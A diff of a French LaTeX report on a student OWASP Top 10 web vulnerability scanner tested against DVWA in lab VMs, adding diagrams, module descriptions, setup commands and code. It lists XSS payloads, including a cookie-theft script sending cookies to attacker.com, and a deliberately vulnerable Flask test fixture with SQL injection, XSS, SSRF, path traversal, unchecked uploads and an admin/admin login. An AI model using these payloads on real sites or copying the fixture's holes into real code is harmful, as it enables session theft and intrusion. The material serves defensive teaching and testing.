@@ -96,6 +96,9 @@
   xrightmargin=4pt,
   captionpos=b,
   belowcaptionskip=4pt,
+  literate={—}{{--}}2 {–}{{-}}1 {é}{{\'e}}1 {è}{{\`e}}1 {ê}{{\^e}}1
+           {à}{{\`a}}1 {â}{{\^a}}1 {ô}{{\^o}}1 {ù}{{\`u}}1 {û}{{\^u}}1
+           {î}{{\^i}}1 {ï}{{\"i}}1 {ë}{{\"e}}1 {ç}{{\c{c}}}1,
 }
 \lstdefinestyle{bash}{language=bash,morekeywords={sudo,apt,pip,python3,git}}
 \lstdefinestyle{python}{language=python}
@@ -105,15 +108,15 @@
 \usepackage{tcolorbox}
 \tcbuselibrary{skins,breakable}
 \newtcolorbox{infobox}[1][]{
-  colback=lightblue, colframe=owaspblue,
-  fonttitle=\bfseries\color{white},
-  coltitle=white, attach boxed title to top left={yshift=-2mm,xshift=4mm},
-  boxed title style={colback=owaspblue},
+  colback=gray!5, colframe=gray!60,
+  fonttitle=\bfseries,
+  coltitle=black, attach boxed title to top left={yshift=-2mm,xshift=4mm},
+  boxed title style={colback=gray!40},
   #1
 }
 \newtcolorbox{critbox}{
-  colback=critred, colframe=owaspred,
-  fonttitle=\bfseries, title={\color{owaspred}$\blacktriangleright$~CRITIQUE},
+  colback=gray!8, colframe=gray!70,
+  fonttitle=\bfseries, title={$\blacktriangleright$~CRITIQUE},
 }
 
 % ── Listes ─────────────────────────────────────────────────
@@ -129,7 +132,9 @@
 
 % ── Figures ────────────────────────────────────────────────
 \usepackage{graphicx}
+\usepackage{grffile}
 \usepackage{caption}
+\graphicspath{{../screenshoots/}}
 \captionsetup{font=small,labelfont={bf,color=owaspblue},
               labelsep=period, skip=6pt}
 
@@ -138,6 +143,7 @@
 \usepackage{amssymb}
 \usepackage{amsmath}
 \usepackage{appendix}
+\usepackage{pdflscape}
 \usepackage{tocbibind}
 \usepackage{emptypage}
 \usepackage{pgfgantt}
@@ -150,12 +156,12 @@
 \newcommand{\owasp}[1]{\textbf{\textcolor{owaspblue}{#1}}}
 \newcommand{\cvss}[2]{\textbf{\textcolor{owaspred}{CVSS #1}} (\textit{#2})}
 \newcommand{\code}[1]{\texttt{#1}}
-\newcommand{\hdr}[1]{\cellcolor{headerbg}\textcolor{white}{\textbf{#1}}}
-\newcommand{\rowA}{\rowcolor{lightblue}}
-\newcommand{\rowB}{\rowcolor{verylightblue}}
-\newcommand{\rowCrit}{\rowcolor{critred}}
+\newcommand{\hdr}[1]{\cellcolor{gray!15}\textbf{#1}}
+\newcommand{\rowA}{\rowcolor{gray!8}}
+\newcommand{\rowB}{\rowcolor{white}}
+\newcommand{\rowCrit}{\rowcolor{gray!15}}
 \newcommand{\blank}{\underline{\hspace{3cm}}}
-\newcommand{\rowcritred}{\rowcolor{critred}}
+\newcommand{\rowcritred}{\rowcolor{gray!8}}
 
 % ============================================================
 \begin{document}
@@ -325,7 +331,7 @@ existants et positionnement de notre solution. Le deuxième chapitre expose la c
 complète : architecture, diagrammes UML et choix technologiques. Le troisième chapitre
 détaille la réalisation : implémentation des modules, suite de tests et études de cas.
 Le quatrième chapitre présente la gestion de projet : cycle de vie, planification, diagrammes
-de Gantt et PERT, ressources et budget. Enfin, le cinquième chapitre aborde la dimension
+de Gantt, ressources et budget. Enfin, le cinquième chapitre aborde la dimension
 entrepreneuriale avec le Business Model Canvas et l'analyse financière.
 % ============================================================
 \chapter{État de l'Art}
@@ -483,10 +489,10 @@ utilisateurs. Trois variantes : \textbf{Réfléchi} (URL), \textbf{Persistant} (
 \textbf{DOM-based} (côté client sans serveur).
 
 \begin{lstlisting}[language=html, caption={Exemples de payloads XSS}]
-<!-- XSS basique — vol de cookie -->
+<!-- XSS basique -- vol de cookie -->
 <script>document.location='http://attacker.com/?c='+document.cookie</script>
 
-<!-- XSS — bypass de filtres -->
+<!-- XSS -- bypass de filtres -->
 <img src=x onerror=alert(1)>
 <svg onload=alert(document.domain)>
 \end{lstlisting}
@@ -568,9 +574,9 @@ pour évaluer la sévérité des vulnérabilités. Notre outil utilise les score
 \toprule
 \hdr{Sévérité} & \hdr{Score} & \hdr{Action} & \hdr{Délai} \\
 \midrule
-\rowcolor{critred} Critique & 9.0 – 10.0 & Correction immédiate & $<$ 24 heures \\
-\rowcolor{orange!20} Élevé   & 7.0 – 8.9  & Correction prioritaire & $<$ 7 jours \\
-\rowcolor{yellow!20} Moyen  & 4.0 – 6.9  & Correction planifiée & $<$ 30 jours \\
+\rowcolor{gray!15} Critique & 9.0 – 10.0 & Correction immédiate & $<$ 24 heures \\
+\rowcolor{gray!8} Élevé   & 7.0 – 8.9  & Correction prioritaire & $<$ 7 jours \\
+\rowcolor{white} Moyen  & 4.0 – 6.9  & Correction planifiée & $<$ 30 jours \\
 \rowB Faible                & 0.1 – 3.9  & Correction à terme & $<$ 90 jours \\
 \bottomrule
 \end{tabular}
@@ -638,6 +644,14 @@ Notre scanner adopte une \textbf{architecture en pipeline à cinq étapes} :
 \;\longrightarrow\; \texttt{Evaluate} \;\longrightarrow\; \texttt{Report}
 \]
 
+\begin{landscape}
+\begin{figure}[p]
+\centering
+\includegraphics[width=\linewidth,height=0.85\textheight,keepaspectratio]{diagram1_architecture.png}
+\caption{Architecture en pipeline du scanner de vulnérabilités}
+\end{figure}
+\end{landscape}
+
 \subsection{Principes de Conception Retenus}
 
 \begin{itemize}
@@ -667,6 +681,14 @@ Factory & detectors/\_\_init\_\_.py & Instanciation par nom (string → classe) 
 \end{table}
 
 \section{Diagramme de Cas d'Utilisation}
+
+\begin{landscape}
+\begin{figure}[p]
+\centering
+\includegraphics[width=\linewidth,height=0.85\textheight,keepaspectratio]{diagram2_use_cases.png}
+\caption{Diagramme de cas d'utilisation du scanner}
+\end{figure}
+\end{landscape}
 
 \begin{table}[h!]
 \centering
@@ -711,6 +733,141 @@ VulnerableComponents  & A06 & Passif  & Bannières version serveur/framework    
 \bottomrule
 \end{tabular}
 \end{table}
+
+\section{Diagramme de Classes}
+
+Le diagramme de classes présente la structure statique du système avec les sept classes
+principales, leurs attributs, méthodes et relations. Les relations de composition (losange
+plein) indiquent que Scanner possède et crée ses dépendances ; les relations d'association
+simple indiquent une utilisation sans possession.
+
+\begin{landscape}
+\begin{figure}[p]
+\centering
+\includegraphics[width=\linewidth,height=0.85\textheight,keepaspectratio]{diagram3_classes.png}
+\caption{Diagramme de classes complet du scanner}
+\end{figure}
+\end{landscape}
+
+\section{Diagramme de Séquence}
+
+Le diagramme de séquence illustre les interactions entre les objets lors d'un cycle de scan
+complet, depuis la commande CLI jusqu'à la génération du rapport HTML final.
+
+\begin{landscape}
+\begin{figure}[p]
+\centering
+\includegraphics[width=\linewidth,height=0.85\textheight,keepaspectratio]{diagram4_sequence.png}
+\caption{Diagramme de séquence --- cycle de scan complet}
+\end{figure}
+\end{landscape}
+
+\section{Description Détaillée des Modules}
+
+\subsection{Module Crawler}
+
+Le Crawler est le premier maillon du pipeline. Son rôle est de découvrir exhaustivement tous
+les points d'entrée testables de l'application cible. Il utilise un algorithme BFS (file FIFO)
+pour explorer l'application de manière ordonnée et contrôlée.
+
+Le Crawler extrait les types d'endpoints suivants :
+\begin{itemize}
+  \item URLs avec paramètres GET : \code{/search?q=test}, \code{/profile?id=1}
+  \item Formulaires HTML (GET et POST) : champs text, password, hidden, select, textarea
+  \item Formulaires multipart (\code{enctype=multipart/form-data}) : upload de fichiers
+  \item Liens internes filtrés : exclusion des liens logout, \code{javascript:}, \code{mailto:}
+\end{itemize}
+
+La déduplication des endpoints se fait via une signature unique :
+\code{METHOD:URL?sorted\_params}.
+
+\subsection{Module BaseDetector (Classe Abstraite)}
+
+BaseDetector implémente le pattern \textbf{Template Method} : la méthode \code{scan\_all()}
+orchestre la boucle sur tous les endpoints et appelle la méthode abstraite \code{scan()}
+implémentée par chaque sous-classe.
+
+Services fournis par BaseDetector à toutes les sous-classes :
+\begin{itemize}
+  \item \code{\_send(url, method, params, data, headers)} : envoi HTTP avec gestion des erreurs
+  \item \code{\_iter\_injection\_points(endpoint)} : itère sur tous les paramètres injectables
+  \item Chargement automatique des payloads depuis \code{payloads/<name>.txt} au démarrage
+  \item \code{scan\_all(endpoints)} : boucle principale + déduplication par signature
+\end{itemize}
+
+\subsection{Module CVSSEvaluator}
+
+Le CVSSEvaluator enrichit chaque objet Vulnerability avec un score CVSS v3.1, un vecteur CVSS
+officiel (ex: \code{CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H}), un niveau de sévérité
+(Critique/Élevé/Moyen/Faible) et une recommandation de remédiation. Les profils CVSS sont
+définis statiquement dans un dictionnaire \code{CVSS\_PROFILES}.
+
+\subsection{Module HTMLReporter}
+
+Le HTMLReporter génère un fichier HTML5 autonome (CSS intégré via balises \code{<style>},
+aucune dépendance CDN externe) contenant : un en-tête avec les métadonnées du scan (cible,
+date, durée, pages crawlées), un tableau de bord avec des cartes de comptage par sévérité,
+et une liste dépliable (\code{<details>/<summary>}) de chaque vulnérabilité avec URL, méthode,
+paramètre, payload, preuve, vecteur CVSS et recommandation.
+
+\section{Structure du Projet}
+
+\begin{verbatim}
+imple/
+|-- main.py                  # Point d'entree CLI (argparse)
+|
+|-- scanner/                 # Orchestrateur principal
+|   |-- __init__.py          # Export Vulnerability + lazy import
+|   |-- core.py              # Classe Scanner + ScanOptions
+|   |-- vulnerability.py     # Dataclass Vulnerability
+|   |-- authenticator.py     # login_dvwa() + login_form_based()
+|
+|-- crawler/
+|   |-- __init__.py
+|   |-- crawler.py           # Classe Crawler BFS + Endpoint
+|
+|-- detectors/
+|   |-- __init__.py          # ALL_DETECTORS dict + exports
+|   |-- base.py              # BaseDetector (Template Method)
+|   |-- sqli.py              # SQLiDetector  - A03
+|   |-- xss.py               # XSSDetector   - A03
+|   |-- ssrf.py              # SSRFDetector  - A10
+|   |-- idor.py              # IDORDetector  - A01
+|   |-- path_traversal.py    # PathTraversalDetector - A01
+|   |-- xxe.py               # XXEDetector   - A05
+|   |-- file_upload.py       # FileUploadDetector - A04
+|   |-- auth.py              # AuthFailuresDetector - A07
+|   |-- crypto.py            # CryptographicFailuresDetector
+|   |-- security_misconfig.py# SecurityMisconfigDetector
+|   |-- components.py        # VulnerableComponentsDetector
+|   |-- integrity.py         # IntegrityDetector - A08
+|
+|-- evaluator/
+|   |-- __init__.py
+|   |-- cvss.py              # CVSSEvaluator + CVSS_PROFILES
+|
+|-- reporter/
+|   |-- __init__.py
+|   |-- html_reporter.py     # HTMLReporter.save()
+|
+|-- payloads/                # Wordlists de payloads
+|   |-- sqli.txt             # 50+ payloads SQLi
+|   |-- xss.txt              # 40+ payloads XSS
+|   |-- ssrf.txt             # 30+ URLs internes
+|   |-- path_traversal.txt   # 25+ sequences ../
+|   |-- xxe.txt              # 15+ payloads XXE
+|
+|-- tests/
+    |-- conftest.py          # Fixture Flask vulnerable
+    |-- test_detectors.py    # Tests detecteurs actifs
+    |-- test_cvss.py         # Tests scoring CVSS
+    |-- test_crawler.py      # Tests BFS et extraction
+    |-- test_reporter.py     # Tests generation HTML
+    |-- test_file_upload.py  # Tests detecteur upload
+    |-- test_passive_detectors.py
+    |-- run_vuln_app.py      # Lance l'app Flask sur :5001
+\end{verbatim}
+\captionof{figure}{Arborescence complète du projet}
 
 \section{Technologies et Stack Technique}
 
@@ -794,6 +951,104 @@ Logiciels principaux    & Python 3.11, pip, venv & Apache 2.4, PHP 8.1, DVWA \\
 \end{tabular}
 \end{table}
 
+\subsection{Configuration Réseau}
+
+\begin{lstlisting}[style=bash, caption={Configuration réseau Ubuntu (VM 1 — Scanner)}]
+# Sur VM 1 (Scanner) -- Configuration interface Host-Only
+sudo nano /etc/netplan/01-netcfg.yaml
+
+network:
+  version: 2
+  ethernets:
+    enp0s3:           # Adaptateur NAT
+      dhcp4: true
+    enp0s8:           # Adaptateur Host-Only
+      addresses: [192.168.56.101/24]
+
+sudo netplan apply
+
+# Verification
+ip addr show enp0s8    # Doit afficher 192.168.56.101/24
+ping 192.168.56.102    # Test connectivite vers VM Cible
+\end{lstlisting}
+
+\subsection{Installation de DVWA sur VM 2 (Cible)}
+
+DVWA (Damn Vulnerable Web Application) version 1.10 a été installée sur la VM Cible.
+C'est une application PHP/MySQL conçue pour les tests de sécurité, proposant des modules
+vulnérables à plusieurs niveaux de difficulté (Low, Medium, High, Impossible).
+
+\begin{lstlisting}[style=bash, caption={Installation complète de DVWA sur Ubuntu (VM 2)}]
+# -- Installation LAMP (Linux Apache MySQL PHP) --
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y apache2 php php-mysql php-gd php-xml \
+    libapache2-mod-php mysql-server git
+
+# -- Securisation MySQL --
+sudo mysql_secure_installation
+
+# -- Creation base de donnees DVWA --
+sudo mysql -u root -p <<EOF
+CREATE DATABASE dvwa CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
+CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd!';
+GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
+FLUSH PRIVILEGES;
+EOF
+
+# -- Telechargement et configuration DVWA --
+cd /var/www/html
+sudo git clone https://github.com/digininja/DVWA.git dvwa
+sudo cp dvwa/config/config.inc.php.dist dvwa/config/config.inc.php
+
+# Modifier config.inc.php :
+# $_DVWA['db_user']     = 'dvwa';
+# $_DVWA['db_password'] = 'p@ssw0rd!';
+# $_DVWA['default_security_level'] = 'low';
+
+# -- Permissions --
+sudo chown -R www-data:www-data /var/www/html/dvwa
+sudo chmod -R 755 /var/www/html/dvwa/hackable/uploads
+
+# -- Activation PHP et redemarrage Apache --
+sudo a2enmod rewrite
+sudo systemctl restart apache2
+
+# Acceder a http://192.168.56.102/dvwa/setup.php
+# Cliquer sur "Create / Reset Database"
+# Login : admin / password, Security Level : Low
+\end{lstlisting}
+
+\subsection{Installation du Scanner sur VM 1}
+
+\begin{lstlisting}[style=bash, caption={Installation et premier test du scanner (VM 1)}]
+# -- Clonage et environnement virtuel --
+git clone <url-du-depot> scanner
+cd scanner/imple
+python3 -m venv .venv
+source .venv/bin/activate      # Linux/macOS
+
+# -- Dependances --
+pip install --upgrade pip
+pip install -r requirements.txt
+# requirements.txt contient :
+# requests>=2.31.0
+# beautifulsoup4>=4.12.0
+# lxml>=4.9.0
+# flask>=3.0.0      (pour l'app de test uniquement)
+# pytest>=7.4.0     (pour les tests)
+
+# -- Verification --
+python main.py --help
+python -m pytest tests/ -v --tb=short
+
+# -- Scan de test rapide --
+python main.py --url http://192.168.56.102/dvwa \
+               --login-url http://192.168.56.102/dvwa/login.php \
+               --username admin --password password \
+               --depth 2 --only sqli,xss \
+               --output test_rapide.html -v
+\end{lstlisting}
+
 \section{Implémentation Détaillée des Modules}
 
 \subsection{Orchestrateur Principal (\texttt{scanner/core.py})}
@@ -873,6 +1128,112 @@ CVSS_PROFILES = {
 }
 \end{lstlisting}
 
+\subsection{Crawler BFS (\texttt{crawler/crawler.py})}
+
+Le Crawler utilise une file FIFO (\code{collections.deque}) pour explorer l'application en
+largeur d'abord. Chaque URL visitée est canonisée avant d'être ajoutée à l'ensemble
+\code{visited}, évitant les visites redondantes.
+
+\begin{lstlisting}[language=python, caption={Algorithme BFS complet du Crawler}]
+@dataclass
+class Endpoint:
+    url: str
+    method: str = "GET"
+    params: dict[str, str] = field(default_factory=dict)
+    form_fields: dict[str, str] = field(default_factory=dict)
+    file_fields: list[str] = field(default_factory=list)
+    enctype: str = ""
+
+    def signature(self) -> str:
+        keys = ",".join(sorted(
+            self.params.keys() | self.form_fields.keys()))
+        return f"{self.method}:{self.url}?{keys}"
+
+def crawl(self) -> list[Endpoint]:
+    queue: deque[tuple[str, int]] = deque([(self.base_url, 0)])
+    seen_signatures: set[str] = set()
+
+    while queue and len(self.visited) < self.max_pages:
+        url, depth = queue.popleft()
+        canonical = _strip_query(url)
+        if canonical in self.visited or depth > self.max_depth:
+            continue
+        self.visited.add(canonical)
+        resp = self._fetch(url)
+        if resp is None or "html" not in resp.headers.get(
+                "Content-Type", ""):
+            continue
+        soup = BeautifulSoup(resp.text, "html.parser")
+
+        # Extraction des parametres GET
+        qs = parse_qs(urlparse(url).query, keep_blank_values=True)
+        if qs:
+            params = {k: v[0] for k, v in qs.items()}
+            ep = Endpoint(url=canonical, method="GET", params=params)
+            if ep.signature() not in seen_signatures:
+                seen_signatures.add(ep.signature())
+                self.endpoints.append(ep)
+
+        # Extraction des formulaires
+        for form in soup.find_all("form"):
+            ep = self._parse_form(form, url)
+            if ep and ep.signature() not in seen_signatures:
+                seen_signatures.add(ep.signature())
+                self.endpoints.append(ep)
+
+        # Suivi des liens internes
+        for a in soup.find_all("a", href=True):
+            href = a["href"].strip()
+            if any(href.startswith(p) for p in
+                   ("javascript:", "mailto:", "tel:", "#")):
+                continue
+            if "logout" in href.lower():
+                continue
+            next_url = urljoin(url, href)
+            if _same_domain(next_url, self.base_url):
+                queue.append((next_url, depth + 1))
+
+    return self.endpoints
+\end{lstlisting}
+
+\subsection{Authenticator (\texttt{scanner/authenticator.py})}
+
+Le module Authenticator gère deux modes d'authentification : le mode DVWA (login spécialisé
+avec gestion du token CSRF \code{user\_token}) et le mode générique (détection automatique
+du formulaire de login et soumission des credentials).
+
+\begin{lstlisting}[language=python, caption={Fonction login\_dvwa() — authentification DVWA}]
+def login_dvwa(session, base_url, username="admin",
+               password="password", security="low",
+               timeout=10) -> bool:
+    login_url = base_url.rstrip("/") + "/login.php"
+    # 1) Recuperer le token CSRF
+    r = session.get(login_url, timeout=timeout)
+    soup = BeautifulSoup(r.text, "html.parser")
+    token = ""
+    if inp := soup.find("input", {"name": "user_token"}):
+        token = inp.get("value", "")
+    # 2) Soumettre le formulaire
+    resp = session.post(login_url, data={
+        "username": username, "password": password,
+        "Login": "Login", "user_token": token
+    }, timeout=timeout)
+    success = ("logout" in resp.text.lower()
+               or "welcome" in resp.text.lower())
+    if success and security != "":
+        # 3) Regler le niveau de securite DVWA
+        sec_url = base_url.rstrip("/") + "/security.php"
+        sr = session.get(sec_url, timeout=timeout)
+        soup2 = BeautifulSoup(sr.text, "html.parser")
+        t2 = soup2.find("input", {"name": "user_token"})
+        token2 = t2.get("value", "") if t2 else ""
+        session.post(sec_url, data={
+            "seclev_submit": "Submit",
+            "security": security,
+            "user_token": token2}, timeout=timeout)
+    return success
+\end{lstlisting}
+
 \section{Interface en Ligne de Commande (CLI)}
 
 \begin{lstlisting}[style=bash, caption={Exemples d'utilisation du scanner}]
@@ -927,6 +1288,64 @@ tests/test_passive_detectors.py::test_missing_csp_header        PASSED
 ========================= 42 passed in 1.43s ===========================
 \end{lstlisting}
 
+\subsection{Application Flask Vulnérable (\texttt{conftest.py})}
+
+La fixture \code{conftest.py} crée une application Flask intentionnellement vulnérable qui
+est lancée en mémoire via un thread daemon. Cette approche rend les tests autonomes et
+reproductibles.
+
+\begin{lstlisting}[language=python, caption={Application Flask vulnérable — fixture de test}]
+def create_vulnerable_app():
+    app = Flask(__name__)
+
+    @app.route("/search")                      # SQLi
+    def search():
+        q = request.args.get("q", "")
+        try:
+            conn = sqlite3.connect(":memory:")
+            conn.execute(
+                f"SELECT * FROM users WHERE name='{q}'")
+        except sqlite3.OperationalError as e:
+            return f"Error: {e}", 500
+        return "OK"
+
+    @app.route("/greet")                       # XSS reflechi
+    def greet():
+        name = request.args.get("name", "")
+        return f"<h1>Hello {name}</h1>"        # PAS d'echappement
+
+    @app.route("/fetch")                       # SSRF
+    def fetch():
+        url = request.args.get("url", "")
+        resp = requests.get(url, timeout=5)
+        return resp.text
+
+    @app.route("/file")                        # Path Traversal
+    def serve_file():
+        page = request.args.get("page", "")
+        with open(page, "r") as f:
+            return f.read()
+
+    @app.route("/upload", methods=["POST"])    # File Upload
+    def upload():
+        f = request.files.get("uploaded")
+        f.save(os.path.join("uploads", f.filename))
+        return "Uploaded"
+
+    @app.route("/login", methods=["GET","POST"])  # Auth
+    def login():
+        if request.method == "POST":
+            if (request.form.get("username") == "admin"
+                    and request.form.get("password") == "admin"):
+                return redirect("/dashboard")
+        return '''<form method="POST">
+            <input name="username">
+            <input type="password" name="password">
+            <button>Login</button></form>'''
+
+    return app
+\end{lstlisting}
+
 \section{Scénarios de Test — Études de Cas}
 
 \subsection{Étude de Cas 1 : SQL Injection — CVSS 9.8 CRITIQUE}
@@ -937,7 +1356,7 @@ tests/test_passive_detectors.py::test_missing_csp_header        PASSED
 
 \begin{lstlisting}[style=bash, caption={Résultat — SQL Injection}]
 Payload    : '
-Reponse    : HTTP 500 — "near "'": syntax error (SQLite)"
+Reponse    : HTTP 500 -- "near "'": syntax error (SQLite)"
 URL        : http://127.0.0.1:5001/search?q='
 Score CVSS : 9.8 -- Critique
 Vecteur    : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
@@ -1020,15 +1439,43 @@ Score       : 6.5 -- Moyen
 \toprule
 \hdr{Sévérité} & \hdr{Nb} & \hdr{Score CVSS} & \hdr{Vulnérabilités} & \hdr{Remédiation} \\
 \midrule
-\rowcolor{critred} Critique & 2 & 9.0–10.0 & Auth Failures (A07), SQL Injection (A03) & $<$ 24h \\
-\rowcolor{orange!20} Élevé & 6 & 7.0–8.9 & File Upload, SSRF, XXE, Crypto, Path Traversal & $<$ 7j \\
-\rowcolor{yellow!20} Moyen & 62 & 4.0–6.9 & XSS$\times$N, IDOR$\times$N, Misconfig$\times$N & $<$ 30j \\
+\rowcolor{gray!15} Critique & 2 & 9.0–10.0 & Auth Failures (A07), SQL Injection (A03) & $<$ 24h \\
+\rowcolor{gray!8} Élevé & 6 & 7.0–8.9 & File Upload, SSRF, XXE, Crypto, Path Traversal & $<$ 7j \\
+\rowcolor{white} Moyen & 62 & 4.0–6.9 & XSS$\times$N, IDOR$\times$N, Misconfig$\times$N & $<$ 30j \\
 \rowB Faible & 0 & 0.1–3.9 & — & $<$ 90j \\
 \midrule
 \textbf{TOTAL} & \textbf{70} & — & \textbf{9/10 catégories OWASP couvertes} & — \\
 \bottomrule
 \end{tabular}
 \end{table}
+
+\subsection{Couverture OWASP Top 10 Détaillée}
+
+\begin{table}[h!]
+\centering
+\caption{Couverture détaillée par catégorie OWASP Top 10}
+\resizebox{\textwidth}{!}{%
+\begin{tabular}{p{1cm}p{4cm}p{4.5cm}p{2.5cm}p{1.5cm}}
+\toprule
+\hdr{Code} & \hdr{Catégorie OWASP 2021} & \hdr{Détecteur} & \hdr{Vulns} & \hdr{Statut} \\
+\midrule
+A01 & Broken Access Control & IDORDetector + PathTraversalDetector & IDOR$\times$N + PathTrav$\times$1 & \textcolor{green!60!black}{\textbf{Couvert}} \\
+\rowA A02 & Cryptographic Failures & CryptographicFailuresDetector & 1 & \textcolor{green!60!black}{\textbf{Couvert}} \\
+A03 & Injection & SQLiDetector + XSSDetector & 1 SQLi + 62 XSS & \textcolor{green!60!black}{\textbf{Couvert}} \\
+\rowA A04 & Insecure Design & FileUploadDetector & 1 & \textcolor{green!60!black}{\textbf{Couvert}} \\
+A05 & Security Misconfiguration & SecurityMisconfigDetector + XXEDetector & 1 XXE + N Misconfig & \textcolor{green!60!black}{\textbf{Couvert}} \\
+\rowA A06 & Vulnerable Components & VulnerableComponentsDetector & N & \textcolor{green!60!black}{\textbf{Couvert}} \\
+A07 & Auth \& Session Failures & AuthFailuresDetector & 1 & \textcolor{green!60!black}{\textbf{Couvert}} \\
+\rowA A08 & Software \& Data Integrity & IntegrityDetector & N & \textcolor{green!60!black}{\textbf{Couvert}} \\
+A09 & Logging \& Monitoring & — & 0 & \textcolor{orange}{\textbf{Non détectable}} \\
+\rowA A10 & SSRF & SSRFDetector & 2 & \textcolor{green!60!black}{\textbf{Couvert}} \\
+\bottomrule
+\end{tabular}}
+\end{table}
+
+La catégorie A09 (Logging \& Monitoring Failures) ne peut pas être évaluée par un scan actif :
+elle nécessite une inspection manuelle des journaux d'accès, des logs applicatifs et des
+configurations SIEM.
 
 \section{Analyse des Performances}
 
@@ -1047,6 +1494,16 @@ DVWA (VM, security=low) & 24 & 3 & Tous (12)     & 18,3s  & 87 \\
 \end{tabular}
 \end{table}
 
+\begin{infobox}[title={Analyse des résultats de performance}]
+\begin{itemize}[nosep]
+  \item Le pipeline est linéaire en $O(\text{pages} \times \text{détecteurs} \times \text{payloads})$ — scalable
+  \item La majorité du temps est passée dans les attentes HTTP (timeout de 10s par requête)
+  \item Le mode \code{--only sqli,xss} réduit le temps de 70~\% tout en couvrant les failles les plus critiques
+  \item Sur DVWA security=medium, 34 vulnérabilités vs 87 en low — les filtres réduisent la surface
+  \item Pas de parallélisme natif — une optimisation future serait \code{asyncio}/\code{concurrent.futures}
+\end{itemize}
+\end{infobox}
+
 % ────────────────────────────────────────────────────────────
 \section{Conclusion}
 % ────────────────────────────────────────────────────────────
@@ -1064,7 +1521,7 @@ suivant présente la gestion du projet et la planification des travaux.
 
 Ce chapitre présente la démarche de gestion de projet adoptée pour ce PFA. Il expose
 le choix du cycle de vie, la répartition détaillée des tâches avec leurs dépendances, le
-diagramme de Gantt, le réseau PERT avec chemin critique, ainsi que la répartition des
+diagramme de Gantt, ainsi que la répartition des
 ressources humaines, matérielles et le budget estimatif.
 
 % ────────────────────────────────────────────────────────────
@@ -1173,21 +1630,6 @@ O & Préparation et soutenance & 5 & 12/05 & 18/05 & N \\
 \end{tabular}}
 \end{table}
 
-\subsection{Niveaux des tâches (classement PERT)}
-
-\begin{itemize}
-  \item \textbf{Niveau 1 :} \{A\} — Aucun prédécesseur.
-  \item \textbf{Niveau 2 :} \{B\} — Précédée par A.
-  \item \textbf{Niveau 3 :} \{C, D\} — Précédées par B.
-  \item \textbf{Niveau 4 :} \{E\} — Précédée par C et D.
-  \item \textbf{Niveau 5 :} \{F, G\} — Précédées par E.
-  \item \textbf{Niveau 6 :} \{H, I\} — H précédée par F, I précédée par G.
-  \item \textbf{Niveau 7 :} \{J, K\} — J précédée par H et I, K précédée par I.
-  \item \textbf{Niveau 8 :} \{L, M\} — L précédée par J et K, M précédée par J.
-  \item \textbf{Niveau 9 :} \{N\} — Précédée par L et M.
-  \item \textbf{Niveau 10 :} \{O\} — Précédée par N.
-\end{itemize}
-
 % ────────────────────────────────────────────────────────────
 \section{Diagramme de Gantt}
 % ────────────────────────────────────────────────────────────
@@ -1211,7 +1653,7 @@ un retard sur la date de fin du projet (18/05/2026).
     title height=1,
     bar/.style={fill=owaspblue!80, rounded corners=2pt},
     bar label font=\small,
-    bar label node/.style={text width=4.5cm, align=right, font=\small},
+    bar label node/.append style={text width=4.5cm, align=right, font=\small},
     group/.style={fill=owaspred!70, draw=owaspred, rounded corners=2pt},
     group label font=\small\bfseries\color{owaspred},
     milestone/.style={fill=owaspred, shape=diamond},
@@ -1221,6 +1663,7 @@ un retard sur la date de fin du projet (18/05/2026).
     canvas/.style={draw=gray!30, fill=white},
     bar height=0.5,
     bar top shift=0.25,
+    link/.style={-latex, thick, owaspred!80},
   ]{1}{10}
   % ── En-têtes semaines
   \gantttitle{\textbf{Mars}}{3}
@@ -1228,21 +1671,21 @@ un retard sur la date de fin du projet (18/05/2026).
   \gantttitle{\textbf{Mai}}{3} \\
   \gantttitlelist{1,...,10}{1} \\
   % ── Tâches (chemin critique en rouge, autres en bleu)
-  \ganttbar[bar/.style={fill=owaspred!80}]{A — Étude des besoins}{1}{1} \\
-  \ganttbar[bar/.style={fill=owaspred!80}]{B — Cahier des charges}{2}{2} \\
-  \ganttbar[bar/.style={fill=owaspred!80}]{C — Conception architecture}{2}{3} \\
-  \ganttbar[bar/.style={fill=owaspblue!60}]{D — Environnement VMs}{2}{2} \\
-  \ganttbar[bar/.style={fill=owaspred!80}]{E — Détecteurs SQLi, XSS}{3}{4} \\
-  \ganttbar[bar/.style={fill=owaspred!80}]{F — Détecteurs SSRF, IDOR}{4}{5} \\
-  \ganttbar[bar/.style={fill=owaspblue!60}]{G — Détecteurs XXE, Upload}{4}{5} \\
-  \ganttbar[bar/.style={fill=owaspred!80}]{H — CVSS + Rapport HTML}{5}{6} \\
-  \ganttbar[bar/.style={fill=owaspblue!60}]{I — CLI + Orchestrateur}{5}{6} \\
-  \ganttbar[bar/.style={fill=owaspred!80}]{J — Tests unitaires}{6}{7} \\
-  \ganttbar[bar/.style={fill=owaspblue!60}]{K — Tests DVWA/VMs}{6}{7} \\
-  \ganttbar[bar/.style={fill=owaspred!80}]{L — Analyse résultats}{7}{8} \\
-  \ganttbar[bar/.style={fill=owaspblue!60}]{M — Rédaction rapport}{7}{8} \\
-  \ganttbar[bar/.style={fill=owaspred!80}]{N — Finalisation}{8}{9} \\
-  \ganttbar[bar/.style={fill=owaspred!80}]{O — Soutenance}{9}{10} \\
+  \ganttbar[bar/.style={fill=owaspred!80}]{A -- \'Etude des besoins}{1}{1} \\
+  \ganttbar[bar/.style={fill=owaspred!80}]{B -- Cahier des charges}{2}{2} \\
+  \ganttbar[bar/.style={fill=owaspred!80}]{C -- Conception architecture}{2}{3} \\
+  \ganttbar[bar/.style={fill=owaspblue!60}]{D -- Environnement VMs}{2}{2} \\
+  \ganttbar[bar/.style={fill=owaspred!80}]{E -- D\'etecteurs SQLi, XSS}{3}{4} \\
+  \ganttbar[bar/.style={fill=owaspred!80}]{F -- D\'etecteurs SSRF, IDOR}{4}{5} \\
+  \ganttbar[bar/.style={fill=owaspblue!60}]{G -- D\'etecteurs XXE, Upload}{4}{5} \\
+  \ganttbar[bar/.style={fill=owaspred!80}]{H -- CVSS + Rapport HTML}{5}{6} \\
+  \ganttbar[bar/.style={fill=owaspblue!60}]{I -- CLI + Orchestrateur}{5}{6} \\
